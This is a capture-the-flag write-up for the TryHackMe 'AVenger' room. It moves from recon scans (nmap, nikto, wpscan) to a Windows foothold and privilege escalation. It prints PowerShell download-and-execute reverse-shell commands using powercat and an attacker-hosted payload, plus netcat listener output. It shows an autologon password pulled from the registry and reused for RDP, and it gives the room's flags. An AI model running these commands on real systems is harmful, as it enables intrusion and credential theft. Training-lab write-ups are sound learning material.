<h1 align="center">AVenger</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/f8d71468-229c-4347-8113-b834229b77f3"><br>
<em>You’ve been asked to exploit all the vulnerabilities present.</em>.<br>
Access it <a href="https://tryhackme.com/room/avenger">here</a>.<br><br>
July 20, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>440</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="1200px" src="https://github.com/user-attachments/assets/1a641a15-055a-4fe9-afbc-d340dc9265f0"></p>

<br>

<h2>Task 1 . Find all the flags</h2>

<p>Welcome, brave cyber warriors, to the Avenger Training Cyber Security Capture the Flag! Prepare yourselves for a wild and wacky adventure through the treacherous realm of cyberspace.
</p>

<p>Your mission, should you choose to accept it (and trust us, you want to), is to outsmart the devious cyber villains, snatch their flags, and assert your dominance as the reigning champions of cyber security. But be warned, the villains won't make it easy for you! </p>

<p>You'll need more than just technical expertise to triumph in this whimsical battle. Think outside the box, unleash your inner prankster, and find unconventional solutions to outwit your opponents. Remember, even the most formidable challenges can be conquered with a healthy dose of laughter and an ingenious trick up your sleeve.</p>

<p>Just a final reminder that AV is enabled, and everything should be patched!</p>

<p>Are you ready to embark on this electrifying journey? Start the virtual machine by pressing the Start Machine button attached to this task. You may access the VM using the AttackBox or your VPN connection. </p>

<p>Can you find all the flags?<br>
The VM may take about 5 minutes to fully boot up.</p>

<br>
<h3 align="left"> Answer the question below</h3>

<p>1.1. Which is the user flag?<br>
<code>_____</code></p>

<br>

<p>1.2. Which is the root flag? <br>
<code>THM{I_CAN_DO_THIS_ALL_DAY}</code></p>

<br>

<h3>nikto</h3>

```bash
~/AVenger# nikto -h TargetIP
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          TargetIP
+ Target Hostname:    ip-xx-xx-xxx-xxx.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2025-07-20 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-3268: /: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x78ae 0x51affc7a4c400 
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /./: Directory indexing found.
+ OSVDB-3268: /?mod=node&nid=some_thing&op=view: Directory indexing found.
+ OSVDB-3268: /?mod=some_thing&op=browse: Directory indexing found.
+ /./: Appending '/./' to a directory allows indexing
+ OSVDB-3268: //: Directory indexing found.
+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ OSVDB-3268: /?Open: Directory indexing found.
+ OSVDB-3268: /?OpenServer: Directory indexing found.
+ OSVDB-3268: /%2e/: Directory indexing found.
+ OSVDB-576: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ OSVDB-3268: /?mod=<script>alert(document.cookie)</script>&op=browse: Directory indexing found.
 OSVDB-3268: /?sql_debug=1: Directory indexing found.
+ OSVDB-3268: ///: Directory indexing found.
+ OSVDB-3268: /?PageServices: Directory indexing found.
+ OSVDB-119: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
+ OSVDB-3268: /?wp-cs-dump: Directory indexing found.
+ OSVDB-119: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
+ OSVDB-3268: /?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3268: /?D=A: Directory indexing found.
+ OSVDB-3268: /?N=D: Directory indexing found.
+ OSVDB-3268: /?S=A: Directory indexing found.
+ OSVDB-3268: /?M=A: Directory indexing found.
+ OSVDB-3268: /?\"><script>alert('Vulnerable');</script>: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3268: /?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: Directory indexing found.
+ OSVDB-3268: /?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
+ OSVDB-3268: /?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
+ OSVDB-3268: /?show=http://cirt.net/rfiinc.txt??: Directory indexing found.
+ Retrieved x-powered-by header: PHP/8.0.28
+ Uncommon header 'link' found, with contents: <http://avenger.tryhackme/gift/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ OSVDB-3268: /?-s: Directory indexing found.
+ 6544 items checked: 0 error(s) and 42 item(s) reported on remote host
+ End Time:           2025-07-20 20:25:23 (GMT1) (99 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h3>nmap</h3>

<p>

- <code>   80</code> : http<br>
- <code>  135</code> : Windows RPC<br>
- <code>  139</code> : Windows netbios-ssn<br>
- <code>  443</code> : https<br>
- <code>  445</code> : microsoft-ds?<br>
- <code> 3306</code> : MySQL 5.5.5-10.4.28-MariaDB<br>
- <code >3389</code> : ms-wbt-server<br>
</p>

```bash
:~/AVenger# nmap -sC -sV -O- -T4 TargetIP
...
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Index of /
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10Txx:xx:xx
|_Not valid after:  2019-11-08Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL 5.5.5-10.4.28-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.28-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, Support41Auth, FoundRows, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, InteractiveClient, LongColumnFlag, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: }%=CwOd*BM=)TKZb_6."
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIFT
|   NetBIOS_Domain_Name: GIFT
|   NetBIOS_Computer_Name: GIFT
|   DNS_Domain_Name: gift
|   DNS_Computer_Name: gift
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-20Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=gift
| Not valid before: 2025-07-19Txx:xx:xx
|_Not valid after:  2026-01-18Txx:xx:xx
|_ssl-date: 2025-07-20Txx:xx:xx+00:00; -1s from scanner time.
```

<h3>dirb</h3>

```bash
:~/AVenger# dirb http://TargetIP
...
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
...
---- Scanning URL: http://TargetIP/ ----
+ http://TargetIP/aux (CODE:403|SIZE:303)                                                              
+ http://TargetIP/cgi-bin/ (CODE:403|SIZE:303)                                                         
+ http://TargetIP/com1 (CODE:403|SIZE:303)                                                             
+ http://TargetIP/com2 (CODE:403|SIZE:303)                                                             
+ http://TargetIP/com3 (CODE:403|SIZE:303)                                                             
+ http://TargetIP/con (CODE:403|SIZE:303)                                                              
==> DIRECTORY: http://TargetIP/dashboard/                                                              
+ http://TargetIP/examples (CODE:503|SIZE:403)                                                         
+ http://TargetIP/favicon.ico (CODE:200|SIZE:30894)                                                    
==> DIRECTORY: http://TargetIP/gift/                                                                   
==> DIRECTORY: http://TargetIP/img/                                                                    
+ http://TargetIP/licenses (CODE:403|SIZE:422)                                                         
+ http://TargetIP/lpt1 (CODE:403|SIZE:303)                                                             
+ http://TargetIP/lpt2 (CODE:403|SIZE:303)                                                             
+ http://TargetIP/nul (CODE:403|SIZE:303)                                                              
+ http://TargetIP/phpmyadmin (CODE:403|SIZE:303)                                                       
+ http://TargetIP/prn (CODE:403|SIZE:303)                                                              
+ http://TargetIP/server-info (CODE:403|SIZE:422)                                                      
+ http://TargetIP/server-status (CODE:403|SIZE:422)                                                    
+ http://TargetIP/webalizer (CODE:403|SIZE:422)                                                        
==> DIRECTORY: http://TargetIP/wordpress/                                                              
                                                                                                            
---- Entering directory: http://TargetIP/dashboard/ ----
+ http://TargetIP/dashboard/aux (CODE:403|SIZE:303)                                                    
+ http://TargetIP/dashboard/com1 (CODE:403|SIZE:303)                                                   
+ http://TargetIP/dashboard/com2 (CODE:403|SIZE:303)                                                   
+ http://TargetIP/dashboard/com3 (CODE:403|SIZE:303)                                                   
+ http://TargetIP/dashboard/con (CODE:403|SIZE:303)                                                    
==> DIRECTORY: http://TargetIP/dashboard/de/                                                           
==> DIRECTORY: http://TargetIP/dashboard/docs/                                                         
==> DIRECTORY: http://TargetIP/dashboard/es/                                                           
+ http://TargetIP/dashboard/favicon.ico (CODE:200|SIZE:1150)                                           
==> DIRECTORY: http://TargetIP/dashboard/fr/                                                           
==> DIRECTORY: http://TargetIP/dashboard/hu/                                                           
==> DIRECTORY: http://TargetIP/dashboard/images/                                                       
==> DIRECTORY: http://TargetIP/dashboard/Images/                                                       
+ http://TargetIP/dashboard/index.html (CODE:200|SIZE:5187)                                            
==> DIRECTORY: http://TargetIP/dashboard/it/                                                           
==> DIRECTORY: http://TargetIP/dashboard/javascripts/                                                  
==> DIRECTORY: http://TargetIP/dashboard/jp/                                                           
+ http://TargetIP/dashboard/lpt1 (CODE:403|SIZE:303)                                                   
+ http://TargetIP/dashboard/lpt2 (CODE:403|SIZE:303)                                                   
+ http://TargetIP/dashboard/nul (CODE:403|SIZE:303)                                                    
+ http://TargetIP/dashboard/phpinfo.php (CODE:200|SIZE:77036)                                          
==> DIRECTORY: http://TargetIP/dashboard/pl/                                                           
+ http://TargetIP/dashboard/prn (CODE:403|SIZE:303)                                                    
==> DIRECTORY: http://TargetIP/dashboard/pt_BR/                                                        
==> DIRECTORY: http://TargetIP/dashboard/ro/                                                           
==> DIRECTORY: http://TargetIP/dashboard/ru/                                                           
==> DIRECTORY: http://TargetIP/dashboard/stylesheets/                                                  
==> DIRECTORY: http://TargetIP/dashboard/tr/                                                           
==> DIRECTORY: http://TargetIP/dashboard/zh_CN/                                                        
==> DIRECTORY: http://TargetIP/dashboard/zh_TW/                                                        
                                                                                                            
---- Entering directory: http://TargetIP/gift/ ----
+ http://TargetIP/gift/0 (CODE:200|SIZE:162355)                                                        
==> DIRECTORY: http://TargetIP/gift/about/                                                             
==> DIRECTORY: http://TargetIP/gift/About/                                                             
+ http://TargetIP/gift/admin (CODE:302|SIZE:0)
+ http://TargetIP/gift/admin (CODE:302|SIZE:0)                                                         
+ http://TargetIP/gift/atom (CODE:301|SIZE:0)                                                          
+ http://TargetIP/gift/aux (CODE:403|SIZE:303)                                                         
^C> Testing: http://TargetIP/gift/binaries   
```

<h3>ffuf</h3>

```bash
:~/AVenger# ffuf -u http://TargetIP/FUZZ -w /usr/share/dirb/wordlists/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://TargetIP/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 303, Words: 22, Lines: 10]
.htpasswd               [Status: 403, Size: 303, Words: 22, Lines: 10]
aux                     [Status: 403, Size: 303, Words: 22, Lines: 10]
cgi-bin/                [Status: 403, Size: 303, Words: 22, Lines: 10]
com4                    [Status: 403, Size: 303, Words: 22, Lines: 10]
com3                    [Status: 403, Size: 303, Words: 22, Lines: 10]
com2                    [Status: 403, Size: 303, Words: 22, Lines: 10]
con                     [Status: 403, Size: 303, Words: 22, Lines: 10]
dashboard               [Status: 301, Size: 343, Words: 22, Lines: 10]
com1                    [Status: 403, Size: 303, Words: 22, Lines: 10]
favicon.ico             [Status: 200, Size: 30894, Words: 412, Lines: 6]
gift                    [Status: 301, Size: 338, Words: 22, Lines: 10]
img                     [Status: 301, Size: 337, Words: 22, Lines: 10]
licenses                [Status: 403, Size: 422, Words: 37, Lines: 12]
lpt2                    [Status: 403, Size: 303, Words: 22, Lines: 10]
lpt1                    [Status: 403, Size: 303, Words: 22, Lines: 10]
nul                     [Status: 403, Size: 303, Words: 22, Lines: 10]
phpmyadmin              [Status: 403, Size: 303, Words: 22, Lines: 10]
prn                     [Status: 403, Size: 303, Words: 22, Lines: 10]
secci\ufffd             [Status: 403, Size: 303, Words: 22, Lines: 10]
server-status           [Status: 403, Size: 422, Words: 37, Lines: 12]
server-info             [Status: 403, Size: 422, Words: 37, Lines: 12]
webalizer               [Status: 403, Size: 422, Words: 37, Lines: 12]
wordpress               [Status: 301, Size: 343, Words: 22, Lines: 10]
xampp                   [Status: 301, Size: 339, Words: 22, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 786 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

<h3>Web</h3>

<img width="1019" height="375" alt="image" src="https://github.com/user-attachments/assets/18a40b6e-4c73-4e5a-8ed2-1805f92ee347" />

<p>- redirects to <code>avenger.tryhackme</code></p>

<img width="1021" height="304" alt="image" src="https://github.com/user-attachments/assets/87f50a83-2b5a-4536-a3dd-51321dbc7b5f" />


<p>/dasboard</p>

<img width="1019" height="375" alt="image" src="https://github.com/user-attachments/assets/f37fc7a4-89ee-4b59-a3f5-ba327cda8de3" />


<h3>/etc/hosts</h3>

```bash
TargetIp    avenger.tryhackme
```

<h3>Web</h3>

<img width="1025" height="671" alt="image" src="https://github.com/user-attachments/assets/5e9e48c8-c390-42e4-bb42-f98af134d52c" />

<img width="1022" height="777" alt="image" src="https://github.com/user-attachments/assets/767638bc-5735-4801-95c5-2b16747c31dd" />


<br>

<h3>wpscan</h3>
<p>

- <code>forminator</code>,  Location: http://avenger.tryhackme/gift/wp-content/plugins/forminator/
</p>


```bash
:~/AVenger# wpscan --url http://avenger.tryhackme/gift
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://avenger.tryhackme/gift/ [TargetIP]
[+] Started: Sun Jul 20 xx:xx:xx3 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
 |  - X-Powered-By: PHP/8.0.28
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://avenger.tryhackme/gift/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://avenger.tryhackme/gift/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://avenger.tryhackme/gift/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://avenger.tryhackme/gift/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:05 <===================================================================================================================================================================================> (705 / 705) 100.00% Time: 00:00:05
[+] WordPress version 5.7 identified (Latest, released on 2021-03-09).
 | Found By: Unique Fingerprinting (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-includes/css/buttons.min.css md5sum is 61acbb6ebdd2479dcb66e467e3f1d80f

[+] WordPress theme in use: astra
 | Location: http://avenger.tryhackme/gift/wp-content/themes/astra/
 | Latest Version: 3.1.2 (up to date)
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://avenger.tryhackme/gift/wp-content/themes/astra/readme.txt
 | Style URL: http://avenger.tryhackme/gift/wp-content/themes/astra/style.css
 | Style Name: Astra
 | Style URI: https://wpastra.com/
 | Description: Astra is fast, fully customizable & beautiful WordPress theme suitable for blog, personal portfolio,...
 | Author: Brainstorm Force
 | Author URI: https://wpastra.com/about/?utm_source=theme_preview&utm_medium=author_link&utm_campaign=astra_theme
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/themes/astra/style.css, Match: 'Version: 4.1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] forminator
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/forminator/
 | Latest Version: 1.14.9 (up to date)
 | Last Updated: 2021-03-11T23:40:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.24.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt

[+] ultimate-addons-for-gutenberg
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/
 | Latest Version: 1.21.1 (up to date)
 | Last Updated: 2021-03-15T09:32:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.6.9 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:44 <================================================================================================================================================================================================================================================> (22 / 22) 100.00% Time: 00:00:44

[i] No Config Backups Found.
```

<br>


<h3>Tests</h3>



<p><em>test.html</em></p>

```bash
<img source="http://10.10.103.154:8000/rocket.jpg"/>
```

<img width="498" height="671" alt="image" src="https://github.com/user-attachments/assets/f68673c6-66bd-497d-b570-b0abf34049a9" />

<br>

<p><em>test.html</em></p>

```bash
<img src="http://10.10.103.154:8000/rocket.jpg"/>
```

<img width="492" height="632" alt="image" src="https://github.com/user-attachments/assets/993aa167-f0b7-44e0-b9cc-ed216d94392d" />

<img width="552" height="74" alt="image" src="https://github.com/user-attachments/assets/ea72d93d-b885-470b-834c-bfdeb256cc3d" />

<br>

<p>https://github.com/besimorhino/powercat/blob/master/powercat.ps1</p>

<img width="519" height="89" alt="image" src="https://github.com/user-attachments/assets/53a27adf-913b-4a0b-9316-ab07c9910dba" />

<img width="929" height="412" alt="image" src="https://github.com/user-attachments/assets/871b52ac-93a9-4b9e-b1d9-b5ff5e2ca33b" />


<p><em>shell.txt</em></p>

```bash
~/AVenger# pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.20.95.132 -p 4444 -e cmd.exe -ge" > /root/AVenger/shell.txt
:~/AVenger# ls
powercat.ps1  rocket.jpg  shell.txt  test.html
```

<br>
<img width="496" height="648" alt="image" src="https://github.com/user-attachments/assets/74ba8992-edc8-40d8-97c3-cd12acebdb2f" />

<p>8:-(</p>

<p><em>test.bat</em></p>

```bash
START /B powershell -c $code=(New-Object System.Net.WebClient).DownloadString('http://10.10.95.132:8000/rev.txt');iex 'powershell -E $code'
```

<p>listener</p>

```bash
nc -nlvp 8888
```

<p>server</p>

```bash
python3 -m http.server
```


<img width="1055" height="768" alt="image" src="https://github.com/user-attachments/assets/d93423de-2c65-4296-be74-93db782053f0" />

<img width="1281" height="818" alt="image" src="https://github.com/user-attachments/assets/af070c25-c204-4348-a508-5327d72b636e" />



```bash
:~/AVenger# nc -nlvp 4444
...
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
gift\hugo

C:\Windows\system32>cd C:\users
cd C:\users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

06/30/2023  07:52 AM    <DIR>          .
06/30/2023  07:52 AM    <DIR>          ..
07/20/2025  08:43 PM    <DIR>          Administrator
11/25/2023  12:15 AM    <DIR>          hugo
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  10,930,335,744 bytes free

C:\Users>cd hugo
cd hugo

...

C:\Users\hugo\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\hugo\Desktop

07/10/2023  09:40 PM    <DIR>          .
07/10/2023  09:40 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
07/25/2023  02:14 PM                48 user.txt
               3 File(s)          1,129 bytes
               2 Dir(s)  10,930,003,968 bytes free

C:\Users\hugo\Desktop>type User.txt
type User.txt
THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}
```

<br>

<img width="1200px" src="https://github.com/user-attachments/assets/6e8e9c6c-d494-43d6-9b26-5a96df777da8"></p>

<br>

```bash
C:\Users\hugo\Desktop>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Remote Desktop Users                                  Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192     
```



```bash
C:\Users\hugo\Desktop>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

<img width="1239" height="756" alt="image" src="https://github.com/user-attachments/assets/a50d4e26-6890-4204-aaa7-3eb4b33eb092" />

```bash
    DefaultUserName    REG_SZ    hugo
    DefaultPassword    REG_SZ    SurpriseMF123!
```

<br>
<br>

```bash
:~/AVenger# xfreerdp /v:10.10.51.22 /u:hugo /p:SurpriseMF123! /dynamic-resolution
...

```

<img width="1537" height="843" alt="image" src="https://github.com/user-attachments/assets/2708f5f8-ab23-470e-84b3-370b906dd794" />

<img width="1531" height="808" alt="image" src="https://github.com/user-attachments/assets/1e784d1e-af8d-468e-944d-c7f6ec6acbc4" />


<br>
<br>
<br>

<img width="1911" height="889" alt="image" src="https://github.com/user-attachments/assets/fdbbef5f-9104-43f2-9daa-901d65698514" />

<img width="1905" height="899" alt="image" src="https://github.com/user-attachments/assets/9a411884-df0a-495c-97f2-f4f5b5b6eade" />


<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 20, 2025     | 440      |     153ʳᵈ    |      5ᵗʰ     |    181st    |     7ᵗʰ    | 115,811 |    869    |    72     |

</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/583daab6-de70-4c57-9621-1454dc9f33a3" />

<img width="1897" height="899" alt="image" src="https://github.com/user-attachments/assets/25274b70-394a-4216-b0ce-dd0ce05ff6ad" />

<img width="1899" height="891" alt="image" src="https://github.com/user-attachments/assets/f09895ca-cb58-4654-ae40-7f845c812a73" />

<img width="1896" height="895" alt="image" src="https://github.com/user-attachments/assets/729d4243-c76a-435b-b56c-9164879e19b7" />

<img width="1905" height="897" alt="image" src="https://github.com/user-attachments/assets/d575885e-df7c-4c99-89cb-54437f6c5822" />
